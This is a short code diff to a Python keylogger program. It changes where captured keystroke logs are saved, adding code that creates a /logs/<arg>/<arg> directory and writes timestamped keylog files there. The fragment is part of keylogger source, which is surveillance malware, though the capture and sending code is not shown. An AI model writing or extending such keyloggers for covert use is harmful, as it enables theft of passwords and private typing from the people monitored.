@@ -5,6 +5,7 @@ from threading import Timer
 from datetime import datetime
 import time
 import sys
+from pathlib import Path
 
 SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
 INTERRUPT_AFTER = 60 # in seconds, 60 means 1 minute and so on
@@ -58,7 +59,8 @@ class Keylogger:
         # construct the filename to be identified by start & end datetimes
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"{sys.argv[1]}/keylog-{start_dt_str}_{end_dt_str}"
+        Path(f"/logs/{sys.argv[2]}/{sys.argv[1]}").mkdir(parents=True, exist_ok=True)
+        self.filename = f"/logs/{sys.argv[2]}/{sys.argv[1]}/keylog-{start_dt_str}_{end_dt_str}"
 
     def report_to_file(self):
         """This method creates a log file in the current directory that contains
